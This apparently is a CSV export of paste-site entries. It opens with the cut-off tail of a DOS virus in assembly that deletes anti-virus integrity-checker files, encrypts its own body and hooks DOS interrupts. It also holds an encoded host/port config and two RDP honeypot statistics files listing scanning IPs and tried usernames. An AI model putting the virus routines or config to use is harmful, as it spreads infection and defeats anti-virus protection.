id,title,username,language,date,content
               call    int21h                                                 
                                                                              
;                mov     ax,0b800h                                            
;                mov     es,ax                 ;I use this bit to test its    
;                mov     al,35                 ;working... It is!!!           
;                mov     byte ptr es:[273],al                                 
                                                                              
               mov     ah,41h                  ;Heh, kill CPAV's generic      
               mov     dx,offset cpav          ;integrity checker... :)       
               call    int21h                  ;Hehe... it'll redo the        
                                               ;whole directory now!          
                                                                              
               mov     ah,41h                                                 
               mov     dx,offset mscpav        ;Kill the microsoft version.   
               call    int21h                                                 
                                                                              
               jmp     longreturn                                             
                                                                              
                                                                              
int21_handler   endp                                                          
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
encrypt_decrypt proc    near                                                  
               mov     cx,offset enc_end - offset enc_start                   
               mov     si,869                                                 
               mov     al,byte ptr enc_var                                    
enc_dec:                                                                      
               xor     byte ptr [si],al                                       
               inc     si                                                     
               neg     al                                                     
               not     al                                                     
               loop    enc_dec                                                
                                                                              
               ret                                                            
encrypt_decrypt endp                                                          
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
                                                                              
Lseek   proc    near                                                          
               mov     ah,42h                                                 
               xor     cx,cx                                                  
               xor     dx,dx                                                  
               call    int21h                                                 
               ret                                                            
Lseek   endp                                                                  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
                                                                              
;Put the interrupts in here...                                                
                                                                              
int24h  proc    near    ;Stops embarassing error messages on write protected  
                       ;diskettes...                                          
                                                                              
               mov     al,3                                                   
               iret                                                           
int24h  endp                                                                  
               i24     dd      0                                              
                                                                              
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
                                                                              
                                                                              
;Crappy Int21h... Not much use calling ourselves now is there ???             
;So use original interrupt...                                                 
                                                                              
int21h  proc    near                                                          
               pushf                                                          
               db      9ah                                                    
               int21_2 dd      0                                              
               ret                                                            
int21h  endp                                                                  
               i21     dd      0                                              
                                                                              
enc_end:                                                                      
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
decrypt proc    near                                                          
               push    si                                                     
               push    cx                                                     
               mov     cx,offset enc_end - offset enc_start                   
               mov     al,byte ptr [si+enc_var]                               
               add     si,offset enc_start                                    
decryption:                                                                   
               xor     byte ptr [si],al                                       
               inc     si                                                     
               neg     al                                                     
               not     al                                                     
               loop    decryption                                             
                                                                              
               pop     cx                                                     
               pop     si                                                     
               ret                                                            
decrypt endp                                                                  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
       enc_var db      0                                                      
m               endp                                                          
                                                                              
                                                                              
               end     start                                                  
"
F4AahC3V,martdd,M4r171,JSON,Friday 30th of June 2023 08:04:57 PM CDT,"inicio{
""host"":""D34F2E1E67DF5FD753C3A490"",
""porta"":""FD7BFC6CA9""
}fim"
64SuHMs0,2023-06-30_stats.json,rdp_snitch,JSON,Friday 30th of June 2023 07:18:02 PM CDT,"{
  ""ip"": {
    ""20.42.101.211"": 135,
    ""114.217.18.245"": 84,
    ""69.58.124.234"": 168,
    ""120.71.0.5"": 120,
    ""139.162.9.46"": 3,
    ""185.66.228.185"": 69,
    ""46.10.214.186"": 87,
    ""194.26.135.222"": 3,
    ""168.138.255.225"": 48,
    ""92.204.139.79"": 129,
    ""168.138.149.190"": 30,
    ""36.108.169.132"": 114,
    ""192.99.110.133"": 21,
    ""125.74.93.228"": 156,
    ""120.132.17.153"": 24,
    ""138.197.8.152"": 15,
    ""152.89.198.133"": 12,
    ""185.161.248.213"": 3,
    ""62.122.184.165"": 12,
    ""194.165.16.78"": 6,
    ""36.156.22.2"": 6,
    ""24.199.110.174"": 6,
    ""117.3.39.244"": 30,
    ""174.138.31.86"": 3,
    ""91.240.118.133"": 24,
    ""87.251.75.145"": 9,
    ""14.237.75.221"": 30,
    ""139.144.184.135"": 30,
    ""178.21.163.70"": 21,
    ""164.92.158.134"": 12,
    ""201.93.165.53"": 24,
    ""31.43.185.32"": 21,
    ""154.26.128.19"": 3,
    ""43.134.101.118"": 9,
    ""45.227.254.8"": 6,
    ""87.251.75.120"": 3,
    ""152.89.198.113"": 12,
    ""185.170.144.3"": 9,
    ""152.67.255.1"": 6,
    ""87.251.64.110"": 6,
    ""167.94.145.60"": 3,
    ""139.162.125.234"": 30,
    ""194.26.29.78"": 6,
    ""146.190.110.202"": 3,
    ""192.99.0.188"": 3,
    ""45.119.81.119"": 3,
    ""143.198.123.49"": 3,
    ""39.104.21.190"": 21,
    ""141.98.81.33"": 3,
    ""141.98.81.5"": 6,
    ""147.78.47.23"": 6,
    ""141.98.9.5"": 36,
    ""141.98.81.29"": 6,
    ""80.94.93.249"": 6,
    ""193.29.13.179"": 6,
    ""88.214.25.26"": 6,
    ""45.227.252.4"": 6,
    ""120.27.12.65"": 3,
    ""61.48.23.122"": 3,
    ""139.162.114.83"": 30,
    ""45.227.254.48"": 6,
    ""172.105.53.82"": 6,
    ""191.101.174.50"": 3,
    ""198.235.24.87"": 9,
    ""112.5.87.34"": 3,
    ""89.248.167.131"": 3,
    ""36.139.61.15"": 3,
    ""87.251.75.64"": 3,
    ""51.75.160.42"": 6,
    ""62.122.184.166"": 12,
    ""62.122.184.168"": 12,
    ""45.227.254.49"": 6,
    ""62.233.50.179"": 6,
    ""107.6.112.252"": 30,
    ""205.210.31.168"": 9
  },
  ""asn"": {
    ""AS8075"": 135,
    ""AS4134"": 84,
    ""AS32899"": 168,
    ""AS137695"": 234,
    ""AS63949"": 99,
    ""AS201689"": 69,
    ""AS8866"": 87,
    ""AS57523"": 93,
    ""AS31898"": 84,
    ""AS398108"": 129,
    ""AS16276"": 30,
    ""AS141998"": 156,
    ""AS140292"": 24,
    ""AS14061"": 42,
    ""AS49202"": 3,
    ""AS48721"": 6,
    ""AS56046"": 6,
    ""AS7552"": 30,
    ""AS208091"": 15,
    ""AS45899"": 30,
    ""AS21419"": 21,
    ""AS27699"": 24,
    ""AS211736"": 21,
    ""AS141995"": 3,
    ""AS132203"": 9,
    ""AS267784"": 24,
    ""AS48080"": 15,
    ""AS398705"": 3,
    ""AS206728"": 6,
    ""AS131386"": 3,
    ""AS37963"": 24,
    ""AS209588"": 57,
    ""AS47890"": 6,
    ""AS42397"": 6,
    ""AS29551"": 6,
    ""AS4808"": 3,
    ""AS32780"": 3,
    ""AS396982"": 18,
    ""AS9808"": 3,
    ""AS202425"": 3,
    ""AS56041"": 3,
    ""AS14636"": 30
  },
  ""isp"": {
    ""Microsoft Corporation"": 135,
    ""Chinanet"": 84,
    ""Bresco Broadband"": 168,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 234,
    ""LINODE"": 3,
    ""Lamerd Information & Communication Technology Co., ltd"": 69,
    ""Vivacom Bulgaria EAD"": 87,
    ""Chang Way Technologies Co. Limited"": 93,
    ""Oracle Corporation"": 84,
    ""GoDaddy.com, LLC"": 129,
    ""OVH SAS"": 30,
    ""China Telecom"": 156,
    ""Addresses CNNIC"": 27,
    ""DigitalOcean, LLC"": 42,
    ""Kisara LLC"": 3,
    ""Flyservers S.A."": 81,
    ""China Mobile Communications Corporation"": 9,
    ""Viettel Corporation"": 30,
    ""XHOST-INTERNET-SOLUTIONS"": 15,
    ""VNPT"": 30,
    ""Akamai Technologies, Inc."": 90,
    ""Pishtaze E Jadid Infomration Company"": 21,
    ""Vivo"": 24,
    ""FOP Dmytro Nedilskyi"": 21,
    ""Cogent Communications"": 3,
    ""Shenzhen Tencent Computer Systems Company Limited"": 9,
    ""Dmitriy Panchenko"": 15,
    ""Censys, Inc."": 3,
    ""Media Land LLC"": 6,
    ""Long Van System Solution"": 3,
    ""Hangzhou Alibaba Advertising Co"": 21,
    ""Unmanaged LTD"": 6,
    ""Bunea TELECOM SRL"": 6,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Flyservers S.A"": 6,
    ""China Unicom Beijing Province Network"": 3,
    ""Akamai Technologies"": 6,
    ""Hosting Services"": 3,
    ""Google LLC"": 18,
    ""China Mobile"": 3,
    ""IP Volume inc"": 3,
    ""Internap Holding LLC"": 30
  },
  ""org"": {
    ""Microsoft Azure Cloud (eastus)"": 135,
    ""Chinanet JS"": 84,
    ""Bresco Broadband"": 168,
    ""Chinanet XJ"": 120,
    ""Linode, LLC"": 63,
    ""Unknown"": 279,
    ""Bulgarian Telecommunications Company Plc"": 87,
    ""Chang Way Technologies Co. Limited"": 63,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 78,
    ""Chinanet ZJ"": 114,
    ""AVAST Software"": 21,
    ""Chinanet GS"": 156,
    ""Digital Ocean"": 15,
    ""Starcrecium Limited"": 24,
    ""Kisara LLC"": 3,
    ""Flyservers S.A"": 27,
    ""China Mobile Communications Corporation"": 12,
    ""DigitalOcean, LLC"": 27,
    ""Xhost Internet Solutions"": 21,
    ""Vietnam Posts and Telecommunications Group"": 30,
    ""Linode"": 36,
    ""TELEF\ufffdNICA BRASIL S.A"": 24,
    ""FOP Dmytro Nedilskyi"": 21,
    ""Contabo Asia Private LTD"": 3,
    ""Tencent Cloud Computing"": 9,
    ""UAB Host Baltic"": 18,
    ""Xhostis"": 9,
    ""Oracle Cloud Infrastructure (us-sanjose-1)"": 6,
    ""Censys, Inc."": 3,
    ""Media Land LLC"": 6,
    ""OVH Hosting, Inc."": 3,
    ""Aliyun Computing Co., LTD"": 24,
    ""Alviva Holding Limited"": 36,
    ""Unmanaged LTD"": 6,
    ""Bunea TELECOM SRL"": 6,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Data Grande S.A"": 6,
    ""Express Technologies Ltd"": 3,
    ""Palo Alto Networks, Inc"": 18,
    ""IP Volume inc"": 3,
    ""OVH Ltd"": 6,
    ""Sierra LLC"": 6,
    ""Internap Holding LLC"": 30
  },
  ""regionName"": {
    ""Virginia"": 264,
    ""Jiangsu"": 90,
    ""Ohio"": 168,
    ""Xinjiang Uyghur Autonomous Region"": 120,
    ""North West"": 42,
    ""Tehran"": 90,
    ""Sofia-Capital"": 87,
    ""Moscow"": 102,
    ""Sao Paulo"": 102,
    ""Zhejiang"": 117,
    ""Quebec"": 24,
    ""Gansu"": 156,
    ""Beijing"": 48,
    ""New Jersey"": 21,
    ""Kaunas"": 6,
    ""California"": 30,
    ""Da Nang"": 30,
    ""South West"": 6,
    ""North Holland"": 81,
    ""Hanoi"": 30,
    ""Georgia"": 30,
    ""Kyiv City"": 21,
    ""North East"": 3,
    ""Vilnius"": 18,
    ""Hesse"": 9,
    ""Tokyo"": 60,
    ""St.-Petersburg"": 6,
    ""Ho Chi Minh"": 3,
    ""Drenthe"": 15,
    ""England"": 12,
    ""Timis"": 6,
    ""Budapest"": 6,
    ""Shandong"": 3,
    ""Maharashtra"": 6,
    ""Guangdong"": 3
  },
  ""country"": {
    ""United States"": 513,
    ""China"": 537,
    ""Singapore"": 51,
    ""Iran"": 90,
    ""Bulgaria"": 87,
    ""Russia"": 108,
    ""Brazil"": 102,
    ""Canada"": 24,
    ""Lithuania"": 24,
    ""Vietnam"": 63,
    ""Netherlands"": 96,
    ""Ukraine"": 21,
    ""Germany"": 9,
    ""Japan"": 60,
    ""United Kingdom"": 12,
    ""Romania"": 6,
    ""Hungary"": 6,
    ""India"": 6
  },
  ""account"": {
    ""142.93.8.59"": 1209,
    ""hello"": 273,
    ""Administr"": 150,
    ""Domain"": 78,
    ""Test"": 39,
    ""nmap"": 6,
    ""(empty)"": 9,
    ""jyDZudIwB"": 3,
    ""iHQVym"": 3,
    ""xIIYXE"": 3,
    ""root"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""VakezhSVU"": 3,
    ""OEVbHJ"": 3,
    ""WvUtTV"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1815
  },
  ""client_build"": {
    ""Unknown"": 1815
  },
  ""client_name"": {
    ""Unknown"": 1815
  },
  ""ip_type"": {
    ""hosting"": 420,
    ""Unknown"": 1251,
    ""proxy"": 51,
    ""hosting & proxy"": 33,
    ""mobile"": 60
  }
}"
KJHB1QMX,2023-06-30_stats.json,rdp_snitch,JSON,Friday 30th of June 2023 07:16:14 PM CDT,"{
  ""ip"": {
    ""20.42.101.211"": 90,
    ""114.217.18.245"": 56,
    ""69.58.124.234"": 112,
    ""120.71.0.5"": 80,
    ""139.162.9.46"": 2,
    ""185.66.228.185"": 46,
    ""46.10.214.186"": 58,
    ""194.26.135.222"": 2,
    ""168.138.255.225"": 32,
    ""92.204.139.79"": 86,
    ""168.138.149.190"": 20,
    ""36.108.169.132"": 76,
    ""192.99.110.133"": 14,
    ""125.74.93.228"": 104,
    ""120.132.17.153"": 16,
    ""138.197.8.152"": 10,
    ""152.89.198.133"": 8,
    ""185.161.248.213"": 2,
    ""62.122.184.165"": 8,
    ""194.165.16.78"": 4,
    ""36.156.22.2"": 4,
    ""24.199.110.174"": 4,
    ""117.3.39.244"": 20,
    ""174.138.31.86"": 2,
    ""91.240.118.133"": 16,
    ""87.251.75.145"": 6,
    ""14.237.75.221"": 20,
    ""139.144.184.135"": 20,
    ""178.21.163.70"": 14,
    ""164.92.158.134"": 8,
    ""201.93.165.53"": 16,
    ""31.43.185.32"": 14,
    ""154.26.128.19"": 2,
    ""43.134.101.118"": 6,
    ""45.227.254.8"": 4,
    ""87.251.75.120"": 2,
    ""152.89.198.113"": 8,
    ""185.170.144.3"": 6,
    ""152.67.255.1"": 4,
    ""87.251.64.110"": 4,
    ""167.94.145.60"": 2,
    ""139.162.125.234"": 20,
    ""194.26.29.78"": 4,
    ""146.190.110.202"": 2,
    ""192.99.0.188"": 2,
    ""45.119.81.119"": 2,
    ""143.198.123.49"": 2,
    ""39.104.21.190"": 14,
    ""141.98.81.33"": 2,
    ""141.98.81.5"": 4,
    ""147.78.47.23"": 4,
    ""141.98.9.5"": 24,
    ""141.98.81.29"": 4,
    ""80.94.93.249"": 4,
    ""193.29.13.179"": 4,
    ""88.214.25.26"": 4,
    ""45.227.252.4"": 4,
    ""120.27.12.65"": 2,
    ""61.48.23.122"": 2,
    ""139.162.114.83"": 20,
    ""45.227.254.48"": 4,
    ""172.105.53.82"": 4,
    ""191.101.174.50"": 2,
    ""198.235.24.87"": 6,
    ""112.5.87.34"": 2,
    ""89.248.167.131"": 2,
    ""36.139.61.15"": 2,
    ""87.251.75.64"": 2,
    ""51.75.160.42"": 4,
    ""62.122.184.166"": 8,
    ""62.122.184.168"": 8,
    ""45.227.254.49"": 4,
    ""62.233.50.179"": 4,
    ""107.6.112.252"": 20,
    ""205.210.31.168"": 6
  },
  ""asn"": {
    ""AS8075"": 90,
    ""AS4134"": 56,
    ""AS32899"": 112,
    ""AS137695"": 156,
    ""AS63949"": 66,
    ""AS201689"": 46,
    ""AS8866"": 58,
    ""AS57523"": 62,
    ""AS31898"": 56,
    ""AS398108"": 86,
    ""AS16276"": 20,
    ""AS141998"": 104,
    ""AS140292"": 16,
    ""AS14061"": 28,
    ""AS49202"": 2,
    ""AS48721"": 4,
    ""AS56046"": 4,
    ""AS7552"": 20,
    ""AS208091"": 10,
    ""AS45899"": 20,
    ""AS21419"": 14,
    ""AS27699"": 16,
    ""AS211736"": 14,
    ""AS141995"": 2,
    ""AS132203"": 6,
    ""AS267784"": 16,
    ""AS48080"": 10,
    ""AS398705"": 2,
    ""AS206728"": 4,
    ""AS131386"": 2,
    ""AS37963"": 16,
    ""AS209588"": 38,
    ""AS47890"": 4,
    ""AS42397"": 4,
    ""AS29551"": 4,
    ""AS4808"": 2,
    ""AS32780"": 2,
    ""AS396982"": 12,
    ""AS9808"": 2,
    ""AS202425"": 2,
    ""AS56041"": 2,
    ""AS14636"": 20
  },
  ""isp"": {
    ""Microsoft Corporation"": 90,
    ""Chinanet"": 56,
    ""Bresco Broadband"": 112,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 156,
    ""LINODE"": 2,
    ""Lamerd Information & Communication Technology Co., ltd"": 46,
    ""Vivacom Bulgaria EAD"": 58,
    ""Chang Way Technologies Co. Limited"": 62,
    ""Oracle Corporation"": 56,
    ""GoDaddy.com, LLC"": 86,
    ""OVH SAS"": 20,
    ""China Telecom"": 104,
    ""Addresses CNNIC"": 18,
    ""DigitalOcean, LLC"": 28,
    ""Kisara LLC"": 2,
    ""Flyservers S.A."": 54,
    ""China Mobile Communications Corporation"": 6,
    ""Viettel Corporation"": 20,
    ""XHOST-INTERNET-SOLUTIONS"": 10,
    ""VNPT"": 20,
    ""Akamai Technologies, Inc."": 60,
    ""Pishtaze E Jadid Infomration Company"": 14,
    ""Vivo"": 16,
    ""FOP Dmytro Nedilskyi"": 14,
    ""Cogent Communications"": 2,
    ""Shenzhen Tencent Computer Systems Company Limited"": 6,
    ""Dmitriy Panchenko"": 10,
    ""Censys, Inc."": 2,
    ""Media Land LLC"": 4,
    ""Long Van System Solution"": 2,
    ""Hangzhou Alibaba Advertising Co"": 14,
    ""Unmanaged LTD"": 4,
    ""Bunea TELECOM SRL"": 4,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Flyservers S.A"": 4,
    ""China Unicom Beijing Province Network"": 2,
    ""Akamai Technologies"": 4,
    ""Hosting Services"": 2,
    ""Google LLC"": 12,
    ""China Mobile"": 2,
    ""IP Volume inc"": 2,
    ""Internap Holding LLC"": 20
  },
  ""org"": {
    ""Microsoft Azure Cloud (eastus)"": 90,
    ""Chinanet JS"": 56,
    ""Bresco Broadband"": 112,
    ""Chinanet XJ"": 80,
    ""Linode, LLC"": 42,
    ""Unknown"": 186,
    ""Bulgarian Telecommunications Company Plc"": 58,
    ""Chang Way Technologies Co. Limited"": 42,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 52,
    ""Chinanet ZJ"": 76,
    ""AVAST Software"": 14,
    ""Chinanet GS"": 104,
    ""Digital Ocean"": 10,
    ""Starcrecium Limited"": 16,
    ""Kisara LLC"": 2,
    ""Flyservers S.A"": 18,
    ""China Mobile Communications Corporation"": 8,
    ""DigitalOcean, LLC"": 18,
    ""Xhost Internet Solutions"": 14,
    ""Vietnam Posts and Telecommunications Group"": 20,
    ""Linode"": 24,
    ""TELEF\ufffdNICA BRASIL S.A"": 16,
    ""FOP Dmytro Nedilskyi"": 14,
    ""Contabo Asia Private LTD"": 2,
    ""Tencent Cloud Computing"": 6,
    ""UAB Host Baltic"": 12,
    ""Xhostis"": 6,
    ""Oracle Cloud Infrastructure (us-sanjose-1)"": 4,
    ""Censys, Inc."": 2,
    ""Media Land LLC"": 4,
    ""OVH Hosting, Inc."": 2,
    ""Aliyun Computing Co., LTD"": 16,
    ""Alviva Holding Limited"": 24,
    ""Unmanaged LTD"": 4,
    ""Bunea TELECOM SRL"": 4,
    ""ThinkTech Technology Industrial CO. Limited"": 4,
    ""Data Grande S.A"": 4,
    ""Express Technologies Ltd"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""IP Volume inc"": 2,
    ""OVH Ltd"": 4,
    ""Sierra LLC"": 4,
    ""Internap Holding LLC"": 20
  },
  ""regionName"": {
    ""Virginia"": 176,
    ""Jiangsu"": 60,
    ""Ohio"": 112,
    ""Xinjiang Uyghur Autonomous Region"": 80,
    ""North West"": 28,
    ""Tehran"": 60,
    ""Sofia-Capital"": 58,
    ""Moscow"": 68,
    ""Sao Paulo"": 68,
    ""Zhejiang"": 78,
    ""Quebec"": 16,
    ""Gansu"": 104,
    ""Beijing"": 32,
    ""New Jersey"": 14,
    ""Kaunas"": 4,
    ""California"": 20,
    ""Da Nang"": 20,
    ""South West"": 4,
    ""North Holland"": 54,
    ""Hanoi"": 20,
    ""Georgia"": 20,
    ""Kyiv City"": 14,
    ""North East"": 2,
    ""Vilnius"": 12,
    ""Hesse"": 6,
    ""Tokyo"": 40,
    ""St.-Petersburg"": 4,
    ""Ho Chi Minh"": 2,
    ""Drenthe"": 10,
    ""England"": 8,
    ""Timis"": 4,
    ""Budapest"": 4,
    ""Shandong"": 2,
    ""Maharashtra"": 4,
    ""Guangdong"": 2
  },
  ""country"": {
    ""United States"": 342,
    ""China"": 358,
    ""Singapore"": 34,
    ""Iran"": 60,
    ""Bulgaria"": 58,
    ""Russia"": 72,
    ""Brazil"": 68,
    ""Canada"": 16,
    ""Lithuania"": 16,
    ""Vietnam"": 42,
    ""Netherlands"": 64,
    ""Ukraine"": 14,
    ""Germany"": 6,
    ""Japan"": 40,
    ""United Kingdom"": 8,
    ""Romania"": 4,
    ""Hungary"": 4,
    ""India"": 4
  },
  ""account"": {
    ""142.93.8.59"": 806,
    ""hello"": 182,
    ""Administr"": 100,
    ""Domain"": 52,
    ""Test"": 26,
    ""nmap"": 4,
    ""(empty)"": 6,
    ""jyDZudIwB"": 2,
    ""iHQVym"": 2,
    ""xIIYXE"": 2,
    ""root"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""VakezhSVU"": 2,
    ""OEVbHJ"": 2,
    ""WvUtTV"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1210
  },
  ""client_build"": {
    ""Unknown"": 1210
  },
  ""client_name"": {
    ""Unknown"": 1210
  },
  ""ip_type"": {
    ""hosting"": 280,
    ""Unknown"": 834,
    ""proxy"": 34,
    ""hosting & proxy"": 22,
    ""mobile"": 40
  }
}"
